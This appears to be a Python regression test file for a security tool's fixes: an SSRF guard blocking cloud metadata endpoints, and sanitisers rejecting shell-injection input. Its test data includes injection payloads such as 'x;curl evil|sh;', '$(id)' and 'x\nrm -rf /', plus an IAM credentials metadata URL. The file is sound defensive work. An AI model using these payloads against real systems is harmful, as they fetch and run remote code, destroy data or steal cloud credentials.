"""Security regression tests for the bug-hunt fixes:
#1 web_fetch_smart SSRF guard, #4 vhost command-injection, #5 pre_hook ctx injection."""

from __future__ import annotations

import re

import pytest

from kryon.skills.pre_hook_integration import _safe_ctx
from kryon.tools.common._url_validation import validate_external_url

# ---------------------------------------------------------------------------
# #1 — SSRF guard: metadata/link-local always blocked; private allowed only with opt-in
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.1.1/",  # link-local APIPA
])
def test_metadata_and_linklocal_blocked_even_when_private_allowed(url):
    assert validate_external_url(url, allow_private=True) is not None


def test_private_allowed_with_optin_blocked_by_default():
    assert validate_external_url("http://10.0.0.5:8080/", allow_private=True) is None  # internal target OK
    assert validate_external_url("http://10.0.0.5:8080/", allow_private=False) is not None  # strict default
    assert validate_external_url("http://127.0.0.1:1337/", allow_private=True) is None  # CTF localhost OK
    assert validate_external_url("http://127.0.0.1:1337/", allow_private=False) is not None


def test_public_url_passes():
    # example.com resolves to a public IP; should pass either way (network permitting).
    err = validate_external_url("https://example.com/", allow_private=True)
    assert err is None or "resolve" in err  # tolerate offline CI


def test_web_fetch_smart_blocks_metadata():
    from kryon.tools.web.web_fetch_smart import web_fetch_smart

    out = web_fetch_smart._raw_fn(url="http://169.254.169.254/latest/meta-data/")  # FunctionTool → _raw_fn
    assert "SSRF guard" in out or "metadata" in out.lower()


# ---------------------------------------------------------------------------
# #5 — pre_hook ctx sanitization
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", [
    "x;curl evil|sh;",
    "x'; curl evil|sh; echo '",
    "$(id)",
    "`whoami`",
    "a b c",          # space
    "x\nrm -rf /",    # newline
    "x&background",
])
def test_safe_ctx_drops_shell_metachars(payload):
    assert _safe_ctx(payload) == ""


@pytest.mark.parametrize("legit", ["10.0.0.5", "host.example.com", "http://10.0.0.5:8080/app", "user@host", "192.168.1.1"])
def test_safe_ctx_preserves_legit(legit):
    assert _safe_ctx(legit) == legit


def test_build_turn_ctx_sanitizes_env(monkeypatch):
    from kryon.skills.pre_hook_integration import build_turn_ctx

    monkeypatch.setenv("KRYON_TARGET_HOST", "x;curl evil|sh;")
    ctx = build_turn_ctx("")
    assert ctx["host"] == "" and ctx["target"] == ""  # injection neutralized


# ---------------------------------------------------------------------------
# #4 — vhost hostname charset (mirrors the guard in investigate._add_vhost_to_hosts)
# ---------------------------------------------------------------------------


def test_vhost_hostname_charset_rejects_injection():
    rx = re.compile(r"[A-Za-z0-9.\-]{1,253}")
    assert rx.fullmatch("beta.creative.thm")
    assert not rx.fullmatch("x'; curl evil|sh; echo '")
    assert not rx.fullmatch("x$(id).com")
